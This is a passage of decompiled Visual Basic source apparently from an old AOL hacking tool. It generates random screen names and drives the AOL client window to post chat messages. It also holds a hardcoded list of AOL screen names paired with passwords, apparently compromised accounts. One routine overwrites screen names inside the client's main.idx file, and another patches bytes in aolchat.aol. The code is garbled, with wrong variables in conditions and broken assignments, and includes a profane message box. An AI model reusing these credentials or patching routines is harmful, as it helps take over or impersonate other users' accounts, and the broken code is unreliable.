ElseIf l1052 = "35" Then l1052 = "8"
ElseIf l1052 = "36" Then l1052 = "9"
ElseIf l1052 = "37" Then l1052 = " "
End If
p1048 = l104E + l1052
Randomize
l1056 = Int((Val("6") * Rnd) + 1)
If l1056 = "1" Then
l1056 = "A"
ElseIf l1056 = "2" Then l1056 = "E"
ElseIf l1056 = "3" Then l1056 = "I"
ElseIf l1056 = "4" Then l1056 = "O"
ElseIf l1056 = "5" Then l1056 = "U"
ElseIf l1056 = "6" Then l1056 = " "
End If
p1048 = l104E + l1052 + l1056
Randomize
l105A = Int((Val("37") * Rnd) + 1)
If l105A = "1" Then
l105A = " "
ElseIf l105A = "2" Then l105A = "B"
ElseIf l105A = "3" Then l105A = "C"
ElseIf l105A = "4" Then l105A = "D"
ElseIf l105A = "5" Then l105A = " "
ElseIf l105A = "6" Then l105A = "F"
ElseIf l105A = "7" Then l105A = "G"
ElseIf l105A = "8" Then l105A = "H"
ElseIf l105A = "9" Then l105A = " "
ElseIf l105A = "10" Then l105A = "J"
ElseIf l105A = "11" Then l105A = "K"
ElseIf l105A = "12" Then l105A = "L"
ElseIf l105A = "13" Then l105A = "M"
ElseIf l105A = "14" Then l105A = "N"
ElseIf l105A = "15" Then l105A = " "
ElseIf l105A = "16" Then l105A = "P"
ElseIf l105A = "17" Then l105A = "Q"
ElseIf l105A = "18" Then l105A = "R"
ElseIf l105A = "19" Then l105A = "S"
ElseIf l105A = "20" Then l105A = "T"
ElseIf l105A = "21" Then l105A = " "
ElseIf l105A = "22" Then l105A = "V"
ElseIf l105A = "23" Then l105A = "W"
ElseIf l105A = "24" Then l105A = "Y"
ElseIf l105A = "25" Then l105A = "X"
ElseIf l105A = "26" Then l105A = "Z"
ElseIf l105A = "27" Then l105A = "0"
ElseIf l105A = "28" Then l105A = "1"
ElseIf l105A = "29" Then l105A = "2"
ElseIf l105A = "30" Then l105A = "3"
ElseIf l105A = "31" Then l105A = "4"
ElseIf l105A = "32" Then l105A = "5"
ElseIf l105A = "33" Then l105A = "6"
ElseIf l105A = "34" Then l105A = "7"
ElseIf l105A = "35" Then l105A = "8"
ElseIf l105A = "36" Then l105A = "9"
ElseIf l105A = "37" Then l105A = " "
End If
p1048 = l104E + l1052 + l1056 + l105A
Randomize
l105E = Int((Val("6") * Rnd) + 1)
If l105E = "1" Then
l105E = "A"
ElseIf l105E = "2" Then l105E = "E"
ElseIf l105E = "3" Then l105E = "I"
ElseIf l105E = "4" Then l105E = "O"
ElseIf l105E = "5" Then l105E = "U"
ElseIf l105E = "6" Then l105E = " "
End If
p1048 = l104E + l1052 + l1056 + l105A + l105E
Randomize
l1062 = Int((Val("37") * Rnd) + 1)
If l1062 = "1" Then
l1062 = ""
ElseIf l1062 = "2" Then l1062 = "B"
ElseIf l1062 = "3" Then l1062 = "C"
ElseIf l1062 = "4" Then l1062 = "D"
ElseIf l1062 = "5" Then l1062 = ""
ElseIf l1062 = "6" Then l1062 = "F"
ElseIf l1062 = "7" Then l1062 = "G"
ElseIf l1062 = "8" Then l1062 = "H"
ElseIf l1062 = "9" Then l1062 = ""
ElseIf l1062 = "10" Then l1062 = "J"
ElseIf l1062 = "11" Then l1062 = "K"
ElseIf l1062 = "12" Then l1062 = "L"
ElseIf l1062 = "13" Then l1062 = "M"
ElseIf l1062 = "14" Then l1062 = "N"
ElseIf l1062 = "15" Then l1062 = ""
ElseIf l1062 = "16" Then l1062 = "P"
ElseIf l1062 = "17" Then l1062 = "Q"
ElseIf l1062 = "18" Then l1062 = "R"
ElseIf l1062 = "19" Then l1062 = "S"
ElseIf l1062 = "20" Then l1062 = "T"
ElseIf l1062 = "21" Then l1062 = ""
ElseIf l1062 = "22" Then l1062 = "V"
ElseIf l1062 = "23" Then l1062 = "W"
ElseIf l1062 = "24" Then l1062 = "Y"
ElseIf l1062 = "25" Then l1062 = "X"
ElseIf l1062 = "26" Then l1062 = "Z"
ElseIf l1062 = "27" Then l1062 = "0"
ElseIf l1062 = "28" Then l1062 = "1"
ElseIf l1062 = "29" Then l1062 = "2"
ElseIf l1062 = "30" Then l1062 = "3"
ElseIf l1062 = "31" Then l1062 = "4"
ElseIf l1062 = "32" Then l1062 = "5"
ElseIf l1062 = "33" Then l1062 = "6"
ElseIf l1062 = "34" Then l1062 = "7"
ElseIf l1062 = "35" Then l1062 = "8"
ElseIf l1062 = "36" Then l1062 = "9"
ElseIf l1062 = "37" Then l1062 = " "
End If
p1048 = l104E + l1052 + l1056 + l105A + l105E + l1062
Randomize
l1066 = Int((Val("6") * Rnd) + 1)
If l1066 = "1" Then
l1066 = "A"
ElseIf l1066 = "2" Then l1066 = "E"
ElseIf l1066 = "3" Then l1066 = "I"
ElseIf l1066 = "4" Then l1066 = "O"
ElseIf l1066 = "5" Then l1066 = "U"
ElseIf l1066 = "6" Then l1066 = " "
End If
p1048 = l104E + l1052 + l1056 + l105A + l105E + l1062 + l1066
Randomize
l106A = Int((Val("37") * Rnd) + 1)
If l106A = "1" Then
l106A = ""
ElseIf l106A = "2" Then l106A = "B"
ElseIf l106A = "3" Then l106A = "C"
ElseIf l106A = "4" Then l106A = "D"
ElseIf l106A = "5" Then l106A = ""
ElseIf l106A = "6" Then l106A = "F"
ElseIf l106A = "7" Then l106A = "G"
ElseIf l106A = "8" Then l106A = "H"
ElseIf l106A = "9" Then l106A = ""
ElseIf l106A = "10" Then l106A = "J"
ElseIf l106A = "11" Then l106A = "K"
ElseIf l106A = "12" Then l106A = "L"
ElseIf l106A = "13" Then l106A = "M"
ElseIf l106A = "14" Then l106A = "N"
ElseIf l106A = "15" Then l106A = ""
ElseIf l106A = "16" Then l106A = "P"
ElseIf l106A = "17" Then l106A = "Q"
ElseIf l106A = "18" Then l106A = "R"
ElseIf l106A = "19" Then l106A = "S"
ElseIf l106A = "20" Then l106A = "T"
ElseIf l106A = "21" Then l106A = ""
ElseIf l106A = "22" Then l106A = "V"
ElseIf l106A = "23" Then l106A = "W"
ElseIf l106A = "24" Then l106A = "Y"
ElseIf l106A = "25" Then l106A = "X"
ElseIf l106A = "26" Then l106A = "Z"
ElseIf l106A = "27" Then l106A = "0"
ElseIf l106A = "28" Then l106A = "1"
ElseIf l106A = "29" Then l106A = "2"
ElseIf l106A = "30" Then l106A = "3"
ElseIf l106A = "31" Then l106A = "4"
ElseIf l106A = "32" Then l106A = "5"
ElseIf l106A = "33" Then l106A = "6"
ElseIf l106A = "34" Then l106A = "7"
ElseIf l106A = "35" Then l106A = "8"
ElseIf l106A = "36" Then l106A = "9"
ElseIf l106A = "37" Then l106A = " "
End If
p1048 = l104E + l1052 + l1056 + l105A + l105E + l1062 + l1066 + l106A
Randomize
l106E = Int((Val("6") * Rnd) + 1)
If l106E = "1" Then
l106E = "E"
ElseIf l106E = "2" Then l106E = "A"
ElseIf l106E = "3" Then l106E = "I"
ElseIf l106E = "4" Then l106E = "O"
ElseIf l106E = "5" Then l106E = "U"
ElseIf l106E = "6" Then l106E = " "
End If
p1048 = l104E + l1052 + l1056 + l105A + l105E + l1062 + l1066 + l106A + l106E
Randomize
l1072 = Int((Val("37") * Rnd) + 1)
If l1072 = "1" Then
l1072 = "A"
ElseIf l1072 = "2" Then l1072 = "B"
ElseIf l1072 = "3" Then l1072 = "C"
ElseIf l1072 = "4" Then l1072 = "D"
ElseIf l1072 = "5" Then l1072 = "E"
ElseIf l1072 = "6" Then l1072 = "F"
ElseIf l1072 = "7" Then l1072 = "G"
ElseIf l1072 = "8" Then l1072 = "H"
ElseIf l1072 = "9" Then l1072 = "I"
ElseIf l1072 = "10" Then l1072 = "J"
ElseIf l1072 = "11" Then l1072 = "K"
ElseIf l1072 = "12" Then l1072 = "L"
ElseIf l1072 = "13" Then l1072 = "M"
ElseIf l1072 = "14" Then l1072 = "N"
ElseIf l1072 = "15" Then l1072 = "O"
ElseIf l1072 = "16" Then l1072 = "P"
ElseIf l1072 = "17" Then l1072 = "Q"
ElseIf l1072 = "18" Then l1072 = "R"
ElseIf l1072 = "19" Then l1072 = "S"
ElseIf l1072 = "20" Then l1072 = "T"
ElseIf l1072 = "21" Then l1072 = "U"
ElseIf l1072 = "22" Then l1072 = "V"
ElseIf l1072 = "23" Then l1072 = "W"
ElseIf l1072 = "24" Then l1072 = "Y"
ElseIf l1072 = "25" Then l1072 = "X"
ElseIf l1072 = "26" Then l1072 = "Z"
ElseIf l1072 = "27" Then l1072 = "0"
ElseIf l1072 = "28" Then l1072 = "1"
ElseIf l1072 = "29" Then l1072 = "2"
ElseIf l1072 = "30" Then l1072 = "3"
ElseIf l1072 = "31" Then l1072 = "4"
ElseIf l1072 = "32" Then l1072 = "5"
ElseIf l1072 = "33" Then l1072 = "6"
ElseIf l1072 = "34" Then l1072 = "7"
ElseIf l1072 = "35" Then l1072 = "8"
ElseIf l1072 = "36" Then l1072 = "9"
ElseIf l1072 = "37" Then l1072 = " "
End If
p1048 = l104E + l1052 + l1056 + l105A + l105E + l1062 + l1066 + l106A + l1072
Randomize
l1076 = Int((Val("37") * Rnd) + 1)
If l1076 = "1" Then
l1076 = "A"
ElseIf l1076 = "2" Then l1076 = "B"
ElseIf l1076 = "3" Then l1076 = "C"
ElseIf l1076 = "4" Then l1076 = "D"
ElseIf l1076 = "5" Then l1076 = "E"
ElseIf l1076 = "6" Then l1076 = "F"
ElseIf l1076 = "7" Then l1076 = "G"
ElseIf l1076 = "8" Then l1076 = "H"
ElseIf l1076 = "9" Then l1076 = "I"
ElseIf l1076 = "10" Then l1076 = "J"
ElseIf l1076 = "11" Then l1076 = "K"
ElseIf l1076 = "12" Then l1076 = "L"
ElseIf l1076 = "13" Then l1076 = "M"
ElseIf l1076 = "14" Then l1076 = "N"
ElseIf l1076 = "15" Then l1076 = "O"
ElseIf l1076 = "16" Then l1076 = "P"
ElseIf l1076 = "17" Then l1076 = "Q"
ElseIf l1076 = "18" Then l1076 = "R"
ElseIf l1076 = "19" Then l1076 = "S"
ElseIf l1076 = "20" Then l1076 = "T"
ElseIf l1076 = "21" Then l1076 = "U"
ElseIf l1076 = "22" Then l1076 = "V"
ElseIf l1076 = "23" Then l1076 = "W"
ElseIf l1076 = "24" Then l1076 = "Y"
ElseIf l1076 = "25" Then l1076 = "X"
ElseIf l1076 = "26" Then l1076 = "Z"
ElseIf l1076 = "27" Then l1076 = "0"
ElseIf l1076 = "28" Then l1076 = "1"
ElseIf l1076 = "29" Then l1076 = "2"
ElseIf l1076 = "30" Then l1076 = "3"
ElseIf l1076 = "31" Then l1076 = "4"
ElseIf l1076 = "32" Then l1076 = "5"
ElseIf l1076 = "33" Then l1076 = "6"
ElseIf l1076 = "34" Then l1076 = "7"
ElseIf l1076 = "35" Then l1076 = "8"
ElseIf l1076 = "36" Then l1076 = "9"
ElseIf l1076 = "37" Then l1076 = ""
End If
p104C = l1076
Randomize
l107A = Int((Val("37") * Rnd) + 1)
If l1072 = "1" Then
l107A = "A"
ElseIf l107A = "2" Then l107A = "B"
ElseIf l107A = "3" Then l107A = "C"
ElseIf l107A = "4" Then l107A = "D"
ElseIf l107A = "5" Then l107A = "E"
ElseIf l107A = "6" Then l107A = "F"
ElseIf l107A = "7" Then l107A = "G"
ElseIf l107A = "8" Then l107A = "H"
ElseIf l107A = "9" Then l107A = "I"
ElseIf l107A = "10" Then l107A = "j"
ElseIf l107A = "11" Then l107A = "k"
ElseIf l107A = "12" Then l107A = "L"
ElseIf l107A = "13" Then l107A = "M"
ElseIf l107A = "14" Then l107A = "N"
ElseIf l107A = "15" Then l107A = "O"
ElseIf l107A = "16" Then l107A = "P"
ElseIf l107A = "17" Then l107A = "Q"
ElseIf l107A = "18" Then l107A = "R"
ElseIf l107A = "19" Then l107A = "S"
ElseIf l107A = "20" Then l107A = "T"
ElseIf l107A = "21" Then l107A = "U"
ElseIf l107A = "22" Then l107A = "V"
ElseIf l107A = "23" Then l107A = "W"
ElseIf l107A = "24" Then l107A = "Y"
ElseIf l107A = "25" Then l107A = "X"
ElseIf l107A = "26" Then l107A = "Z"
ElseIf l107A = "27" Then l107A = "0"
ElseIf l107A = "28" Then l107A = "1"
ElseIf l107A = "29" Then l107A = "2"
ElseIf l107A = "30" Then l107A = "3"
ElseIf l107A = "31" Then l107A = "4"
ElseIf l107A = "32" Then l107A = "5"
ElseIf l107A = "33" Then l107A = "6"
ElseIf l107A = "34" Then l107A = "7"
ElseIf l107A = "35" Then l107A = "8"
ElseIf l107A = "36" Then l107A = "9"
ElseIf l107A = "37" Then l107A = ""
End If
p104C = l1076 + l107A
Randomize
l107E = Int((Val("37") * Rnd) + 1)
If l1072 = "1" Then
l107E = "A"
ElseIf l107E = "2" Then l107E = "B"
ElseIf l107E = "3" Then l107E = "C"
ElseIf l107E = "4" Then l107E = "D"
ElseIf l107E = "5" Then l107E = "E"
ElseIf l107E = "6" Then l107E = "F"
ElseIf l107E = "7" Then l107E = "G"
ElseIf l107E = "8" Then l107E = "H"
ElseIf l107E = "9" Then l107E = "I"
ElseIf l107E = "10" Then l107E = "k"
ElseIf l107E = "11" Then l107E = "l"
ElseIf l107E = "12" Then l107E = "m"
ElseIf l107E = "13" Then l107E = "M"
ElseIf l107E = "14" Then l107E = "N"
ElseIf l107E = "15" Then l107E = "O"
ElseIf l107E = "16" Then l107E = "P"
ElseIf l107E = "17" Then l107E = "Q"
ElseIf l107E = "18" Then l107E = "R"
ElseIf l107E = "19" Then l107E = "S"
ElseIf l107E = "20" Then l107E = "T"
ElseIf l107E = "21" Then l107E = "U"
ElseIf l107E = "22" Then l107E = "V"
ElseIf l107E = "23" Then l107E = "W"
ElseIf l107E = "24" Then l107E = "Y"
ElseIf l107E = "25" Then l107E = "X"
ElseIf l107E = "26" Then l107E = "Z"
ElseIf l107E = "27" Then l107E = "0"
ElseIf l107E = "28" Then l107E = "1"
ElseIf l107E = "29" Then l107E = "2"
ElseIf l107E = "30" Then l107E = "3"
ElseIf l107E = "31" Then l107E = "4"
ElseIf l107E = "32" Then l107E = "5"
ElseIf l107E = "33" Then l107E = "6"
ElseIf l107E = "34" Then l107E = "7"
ElseIf l107E = "35" Then l107E = "8"
ElseIf l107E = "36" Then l107E = "9"
ElseIf l107E = "37" Then l107E = ""
End If
p104C = l1076 + l107A + l107E
Randomize
l1082 = Int((Val("37") * Rnd) + 1)
If l1072 = "1" Then
l1082 = "A"
ElseIf l1082 = "2" Then l1082 = "B"
ElseIf l1082 = "3" Then l1082 = "C"
ElseIf l1082 = "4" Then l1082 = "D"
ElseIf l1082 = "5" Then l1082 = "E"
ElseIf l1082 = "6" Then l1082 = "F"
ElseIf l1082 = "7" Then l1082 = "G"
ElseIf l1082 = "8" Then l1082 = "H"
ElseIf l1082 = "9" Then l1082 = "I"
ElseIf l1082 = "10" Then l1082 = "k"
ElseIf l1082 = "11" Then l1082 = "l"
ElseIf l1082 = "12" Then l1082 = "m"
ElseIf l1082 = "13" Then l1082 = "n"
ElseIf l1082 = "14" Then l1082 = "N"
ElseIf l1082 = "15" Then l1082 = "O"
ElseIf l1082 = "16" Then l1082 = "P"
ElseIf l1082 = "17" Then l1082 = "Q"
ElseIf l1082 = "18" Then l1082 = "R"
ElseIf l1082 = "19" Then l1082 = "S"
ElseIf l1082 = "20" Then l1082 = "T"
ElseIf l1082 = "21" Then l1082 = "U"
ElseIf l1082 = "22" Then l1082 = "V"
ElseIf l1082 = "23" Then l1082 = "W"
ElseIf l1082 = "24" Then l1082 = "Y"
ElseIf l1082 = "25" Then l1082 = "X"
ElseIf l1082 = "26" Then l1082 = "Z"
ElseIf l1082 = "27" Then l1082 = "0"
ElseIf l1082 = "28" Then l1082 = "1"
ElseIf l1082 = "29" Then l1082 = "2"
ElseIf l1082 = "30" Then l1082 = "3"
ElseIf l1082 = "31" Then l1082 = "4"
ElseIf l1082 = "32" Then l1082 = "5"
ElseIf l1082 = "33" Then l1082 = "6"
ElseIf l1082 = "34" Then l1082 = "7"
ElseIf l1082 = "35" Then l1082 = "8"
ElseIf l1082 = "36" Then l1082 = "9"
ElseIf l1082 = "37" Then l1082 = ""
End If
p104C = l1076 + l107A + l107E + l1082
Randomize
l1086 = Int((Val("37") * Rnd) + 1)
If l1072 = "1" Then
l1086 = "A"
ElseIf l1086 = "2" Then l1086 = "B"
ElseIf l1086 = "3" Then l1086 = "C"
ElseIf l1086 = "4" Then l1086 = "D"
ElseIf l1086 = "5" Then l1086 = "E"
ElseIf l1086 = "6" Then l1086 = "F"
ElseIf l1086 = "7" Then l1086 = "G"
ElseIf l1086 = "8" Then l1086 = "H"
ElseIf l1086 = "9" Then l1086 = "I"
ElseIf l1086 = "10" Then l1086 = "k"
ElseIf l1086 = "11" Then l1086 = "l"
ElseIf l1086 = "12" Then l1086 = "m"
ElseIf l1086 = "13" Then l1086 = "M"
ElseIf l1086 = "14" Then l1086 = "N"
ElseIf l1086 = "15" Then l1086 = "O"
ElseIf l1086 = "16" Then l1086 = "P"
ElseIf l1086 = "17" Then l1086 = "Q"
ElseIf l1086 = "18" Then l1086 = "R"
ElseIf l1086 = "19" Then l1086 = "S"
ElseIf l1086 = "20" Then l1086 = "T"
ElseIf l1086 = "21" Then l1086 = "U"
ElseIf l1086 = "22" Then l1086 = "V"
ElseIf l1086 = "23" Then l1086 = "W"
ElseIf l1086 = "24" Then l1086 = "Y"
ElseIf l1086 = "25" Then l1086 = "X"
ElseIf l1086 = "26" Then l1086 = "Z"
ElseIf l1086 = "27" Then l1086 = "0"
ElseIf l1086 = "28" Then l1086 = "1"
ElseIf l1086 = "29" Then l1086 = "2"
ElseIf l1086 = "30" Then l1086 = "3"
ElseIf l1086 = "31" Then l1086 = "4"
ElseIf l1086 = "32" Then l1086 = "5"
ElseIf l1086 = "33" Then l1086 = "6"
ElseIf l1086 = "34" Then l1086 = "7"
ElseIf l1086 = "35" Then l1086 = "8"
ElseIf l1086 = "36" Then l1086 = "9"
ElseIf l1086 = "37" Then l1086 = ""
End If
p104C = l1076 + l107A + l107E + l1082 + l1086
End Sub

Sub sub1E50 (p108C As TextBox, p1090 As TextBox)
Dim l1092 As Variant
Dim l1096 As Variant
Randomize
l1092 = Int(25 * Rnd + 1)
If l1092 = "1" Then l1092 = "DethMet" & l1096 = "WaReZ"
If l1092 = "2" Then l1092 = "Xq311pX" & l1096 = "kewl"
If l1092 = "2" Then l1092 = "Xq311pX" & l1096 = "kewl"
If l1092 = "3" Then l1092 = "Xxo311oxX" & l1096 = "pass"
If l1092 = "4" Then l1092 = "iil Cease" & l1096 = "qwert"
If l1092 = "5" Then l1092 = "texasange1" & l1096 = "horse"
If l1092 = "6" Then l1092 = "MattM350" & l1096 = "dr6zg"
If l1092 = "7" Then l1092 = "Xx4tayxX" & l1096 = "HeHeHe"
If l1092 = "8" Then l1092 = "RickG15" & l1096 = "laser"
If l1092 = "9" Then l1092 = "Codogg69" & l1096 = "SNOOP"
If l1092 = "10" Then l1092 = "NastyNoz16" & l1096 = "Thugluve"
If l1092 = "11" Then l1092 = "MuscleBal1" & l1096 = "Fila"
If l1092 = "12" Then l1092 = "PITBUL5" & l1096 = "doodle"
If l1092 = "14" Then l1092 = "Topgun1983" & l1096 = "4252"
If l1092 = "15" Then l1092 = "MMata39751" & l1096 = "hello"
If l1092 = "16" Then l1092 = "THEFIRM SH" & l1096 = "49311"
If l1092 = "17" Then l1092 = "AAmodei" & l1096 = "rainfall"
If l1092 = "18" Then l1092 = "VileBillC" & l1096 = "carpet2"
If l1092 = "19" Then l1092 = "R44js" & l1096 = "X-MEN"
If l1092 = "16" Then l1092 = "CHEO8055" & l1096 = "booo"
If l1092 = "17" Then l1092 = "TotalCaos5" & l1096 = "chaos"
If l1092 = "18" Then l1092 = "DethMet" & l1096 = "daemon"
If l1092 = "19" Then l1092 = "ILLumina01" & l1096 = "banana"
If l1092 = "20" Then l1092 = "Crshovr921" & l1096 = "0516"
If l1092 = "21" Then l1092 = "WiPe IcE" & l1096 = "guild"
If l1092 = "22" Then l1092 = "DMath37689" & l1096 = "trigger"
If l1092 = "23" Then l1092 = "Zantaclwz3" & l1096 = "301644"
If l1092 = "24" Then l1092 = "ID HiTMaN" & l1096 = "id2id2"
If l1092 = "25" Then l1092 = "Twiggy8989" & l1096 = "metal"
p108C.Text = "SN:  " & l1092
p1090.Text = "PW:  " & l1096
End Sub

Sub sub1E88 (p109A As Variant)
Dim l109E As String
Dim l10A0 As Variant
Dim l10A4 As Variant
Dim l10A8 As Integer
Dim l10AA As Integer
l109E$ = p109A
   l10A8% = l10A0 Or l10A4
   l10AA% = extfn2E48(l109E$, l10A8%)
End Sub

Sub sub1EC0 ()
Dim l10AC As Variant
Dim l10B0 As Integer
Dim l10B2 As Variant
Dim l10B6 As Integer
Call sub2278(4, 2)
l10AC = fn2A20("Preferences", "AOL Child")
l10B0% = extfn4D90(l10AC, "_AOL_Icon")
sub9F8 l10B0%
l10B2 = fn2A20("Chat Preferences", "_AOL_Modal")
l10B6% = extfn4D58(l10B2, "Cancel")
sub9F8 l10B6%
sub1A28 l10AC
End Sub

Sub sub20B8 (p112A)
Dim l112C As Variant
l112C = fn6B0()
If l112C = "C:\aol30" Then
Open "C:\aol30\tool\aolchat.aol" For Binary As #1
Seek #1, 6887
Put #1, , p112A
Close #1
ElseIf l112C = "C:\aol25" Then
Open "C:\aol25\tool\chat.aol" For Binary As #1
Seek #1, 6887
Put #1, , p112A
Close #1
End If
End Sub

Sub sub20F0 (p1130 As Integer, p1132 As String, p1134 As String)
Dim l1136 As Variant
Dim l113A As String
Dim l113C As String
l1136 = fn15C8(p1130%)
If InStr(l1136, p1132$) Then
l113A$ = Left$(l1136, InStr(l1136, p1132$) - 1)
l113C$ = Mid$(l1136, InStr(l1136, p1132$) + 1)
sub2320 p1130%, l113A$ & p1134$ & l113C$
End If
End Sub

Sub sub2160 (p1156 As String, p1158 As String, p115A As String)
Static m115E As String * 40000
Dim lAD9E As Long
Dim lADA0 As Long
Dim lADAC As String
Screen.MousePointer = 11
If UCase$(Trim$(p1156)) = "NEWUSER" Then MsgBox ("AOL is already on new user!"): Exit Sub
On Error GoTo L1678A
If Len(p1156) < 7 Then MsgBox ("The screen name hasta be at least 7 characters long :)"): Exit Sub
p1158 = p1158 + String$(Len(p1156) - 7, " ")
Let lADAC$ = (p115A & "\idb\main.idx")
Open lADAC$ For Binary As #1
lAD9E& = 1
lADA0& = LOF(1)
While lAD9E& < lADA0&
    m115E = String$(16384, Chr$(0))
    Get #1, lAD9E&, m115E
    While InStr(UCase$(m115E), UCase$(p1156)) <> 0
        Mid$(m115E, InStr(UCase$(m115E), UCase$(p1156))) = p1158
    Wend
    Put #1, lAD9E&, m115E
    lAD9E& = lAD9E& + 40000
Wend
Seek #1, Len(p1156)
lAD9E& = Len(p1156)
While lAD9E& < lADA0&
m115E = String$(16384, " ")
    Get #1, lAD9E&, m115E
    While InStr(UCase$(m115E), UCase$(p1156)) <> 0
        Mid$(m115E, InStr(UCase$(m115E), UCase$(p1156))) = p1158
        Wend
    Put #1, lAD9E&, m115E
    lAD9E& = lAD9E& + 16384
Wend
Close #1
Screen.MousePointer = 0
L1678A:
Screen.MousePointer = 0
Exit Sub
Resume Next
End Sub

Sub sub2198 (ByVal pADAE As String)
Dim lADB0 As Integer
Dim lADB2 As Integer
Dim lADB4 As Integer
Dim lADB6 As Integer
Dim lADB8 As Integer
Dim lADBA As Integer
Dim lADBC As Integer
Dim lADBE As String
Dim lADC0 As Variant
Dim lADC4 As Variant
Dim lADC8 As Variant
Dim lADCC As Variant
lADC0 = extfn2EB8%("AOL Frame25", 0&)
lADB0 = extfn2CC0%(lADC0)
lADB2 = extfn4AF0%(lADB0)
For lADB4 = 0 To lADB2 - 1
    lADB6 = extfn4BD0%(lADB0, lADB4)
    lADB8 = extfn4AF0%(lADB6)
    For lADBA = 0 To lADB8 - 1
    lADBC = 30
    lADBE = Space(30)
    lADC4 = extfn4B28%(lADB6, lADBA, lADBE, lADBC, gc05CE)
    If InStr(UCase$(lADBE), UCase$(pADAE)) Then
        lADC8 = extfn4B98%(lADB6, lADBA)
        lADCC = extfn4CB0(lADC0, gc05D0, lADC8, 0)
        DoEvents
        Exit Sub
    End If
    DoEvents
    Next lADBA
Next lADB4
End Sub

Sub sub2278 (pAE36 As Variant, pAE3A As Variant)
Dim lAE3E As Variant
Dim lAE42 As Variant
Dim lAE46 As Variant
Dim lAE4A As Variant
Dim lAE4E As Integer
lAE4E = extfn2EB8("AOL Frame25", 0&)
lAE4A = extfn2CC0(lAE4E)
lAE46 = extfn4BD0(lAE4A, pAE36)
lAE42 = extfn4B98(lAE46, pAE3A)
lAE3E = extfn4CB0(lAE4E, gc05D0, lAE42, 0)
End Sub

Sub sub22B0 (pAE50 As Variant, pAE54 As Variant)
Dim lAE58 As Integer
Dim lAE5A As Integer
Dim lAE5C As Variant
Dim lAE60 As Integer
Dim lAE62 As Integer
Dim lAE64 As Variant
Dim lAE68 As Integer
Dim lAE6A As String
Dim lAE6C As Integer
Dim lAE6E As Integer
Dim lAE70 As Integer
lAE58% = extfn2CC0(pAE50)
lAE5A% = extfn4AF0(lAE58%)
For lAE5C = 0 To lAE5A% - 1
lAE60% = extfn4BD0(lAE58%, lAE5C)
lAE62% = extfn4AF0(lAE60%)
For lAE64 = 0 To lAE62% - 1
lAE68% = extfn4B98(lAE60%, lAE64)
lAE6A$ = String$(100, " ")
lAE6C% = extfn4B28(lAE60%, lAE68%, lAE6A$, 100, 1)
If InStr(UCase(lAE6A$), UCase(pAE54)) Then
lAE6E% = lAE68%
GoTo L16DD0
End If
Next lAE64
Next lAE5C
L16DD0:
lAE70% = extfn4C78(pAE50, gc05D0, lAE6E%, 0)
End Sub

Sub sub22E8 (pAE72 As Integer)
Dim lAE74 As Integer
Dim lAE76 As Integer
Dim lAE78 As Integer
Dim lAE7A As Integer
Dim lAE7C As Integer
Dim lAE7E As Integer
Dim lAE80 As Integer
Dim lAE82 As Integer
Dim lAE84 As Integer
Dim lAE86 As Integer
Dim lAE88 As Integer
Dim lAE8A As Integer
Dim lAE8C As Integer
Dim lAE8E As Integer
Dim lAE90 As Integer
Dim lAE92 As Integer
Dim lAE94 As Integer
Dim lAE96 As Integer
Dim lAE98 As Integer
Dim lAE9A As Integer
Dim lAE9C As Integer
Dim lAE9E As Integer
Dim lAEA0 As Integer
lAE74% = extfn2EB8("AOL Frame25", 0&)
lAE76% = extfn4D90(lAE74%, "AOL Toolbar")
lAE78% = extfn4D90(lAE76%, "_AOL_Icon")
lAE7A% = extfn4C40(lAE78%, gc05CA)
lAE7C% = extfn4C40(lAE7A%, gc05CA)
lAE7E% = extfn4C40(lAE7C%, gc05CA)
lAE80% = extfn4C40(lAE7E%, gc05CA)
lAE82% = extfn4C40(lAE80%, gc05CA)
lAE84% = extfn4C40(lAE82%, gc05CA)
lAE86% = extfn4C40(lAE84%, gc05CA)
lAE88% = extfn4C40(lAE86%, gc05CA)
lAE8A% = extfn4C40(lAE88%, gc05CA)
lAE8C% = extfn4C40(lAE8A%, gc05CA)
lAE8E% = extfn4C40(lAE8C%, gc05CA)
lAE90% = extfn4C40(lAE8E%, gc05CA)
lAE92% = extfn4C40(lAE90%, gc05CA)
lAE94% = extfn4C40(lAE92%, gc05CA)
lAE96% = extfn4C40(lAE94%, gc05CA)
lAE98% = extfn4C40(lAE96%, gc05CA)
lAE9A% = extfn4C40(lAE98%, gc05CA)
lAE9C% = extfn4C40(lAE9A%, gc05CA)
lAE9E% = extfn4C40(lAE9C%, gc05CA)
If pAE72 = 1 Then lAEA0% = lAE78%
If pAE72 = 2 Then lAEA0% = lAE7A%
If pAE72 = 3 Then lAEA0% = lAE7C%
If pAE72 = 4 Then lAEA0% = lAE80%
If pAE72 = 5 Then lAEA0% = lAE82%
If pAE72 = 6 Then lAEA0% = lAE84%
If pAE72 = 7 Then lAEA0% = lAE86%
If pAE72 = 8 Then lAEA0% = lAE88%
If pAE72 = 9 Then lAEA0% = lAE8A%
If pAE72 = 10 Then lAEA0% = lAE8C%
If pAE72 = 11 Then lAEA0% = lAE8E%
If pAE72 = 12 Then lAEA0% = lAE90%
If pAE72 = 13 Then lAEA0% = lAE92%
If pAE72 = 14 Then lAEA0% = lAE94%
If pAE72 = 15 Then lAEA0% = lAE96%
If pAE72 = 16 Then lAEA0% = lAE98%
If pAE72 = 17 Then lAEA0% = lAE9A%
If pAE72 = 18 Then lAEA0% = lAE9C%
If pAE72 = 19 Then lAEA0% = lAE9E%
DoEvents
sub9F8 (lAEA0%)
End Sub

Sub sub2320 (pAEA2 As Variant, pAEA6 As String)
Dim lAEA8 As Variant
lAEA8 = extfn4CE8(pAEA2, gc05D6, 0, pAEA6$)
End Sub

Sub sub2358 (pAEAC As String)
Dim lAEAE As Integer
Dim lAEB0 As Integer
Dim lAEB2 As Variant
lAEAE% = extfn2EB8("AOL FRAME25", 0&)
If lAEAE% = 0 Then
Exit Sub
End If
lAEB0% = extfn4D90(lAEAE%, "_AOL_EDIT")
If lAEB0% = 0 Then
MsgBox "You have to be in a chatroom dumbfuck!", 56, "Dumbass!"
Exit Sub
End If
lAEB2 = extfn4CE8(lAEB0%, gc05D6, 0&, pAEAC$)
DoEvents
lAEB2 = extfn4CB0(lAEB0%, gc05D2, 13, 0&)
DoEvents
End Sub

Sub sub2390 (pAEB6 As Variant, pAEBA As String)
Dim lAEBC As Integer
Dim lAEBE As Integer
lAEBC% = extfn4CE8(pAEB6, gc05D6, 0, pAEBA$)
lAEBE% = extfn4CB0(pAEB6, gc05D2, 13, 0)
sub27F0 (.001)
End Sub

Sub sub23C8 (pAEC0 As String)
Dim lAEC2 As Integer
Dim lAEC4 As Integer
Dim lAEC6 As Integer
Dim lAEC8 As Integer
lAEC2% = extfn2EB8("AOL Frame25", 0&)
